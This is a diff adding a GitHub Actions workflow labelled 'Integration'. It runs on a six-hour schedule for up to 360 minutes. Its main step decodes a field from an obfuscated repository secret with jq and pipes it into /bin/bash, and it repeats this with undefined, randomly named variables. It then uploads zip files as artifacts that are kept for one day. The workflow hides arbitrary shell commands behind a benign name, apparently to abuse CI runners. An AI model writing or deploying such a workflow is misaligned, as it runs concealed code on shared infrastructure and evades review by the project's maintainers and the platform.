@@ -1,0 +1,36 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Start
+        env:
+          stra10772: ${{ secrets.stra10772 }}
+        run: |
+          printf '%s' "$stra10772" | jq -r .ipwi367 | /bin/bash
+          echo $mtywy1090 | jq -r .z73 | /bin/bash
+          echo $pp66327 | jq -r .wq9410 | /bin/bash
+          printf '%s' "$pkb0294" | jq -r .gznx2356 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: j6N3N7n3
+          path: "*.zip"
+          retention-days: 1
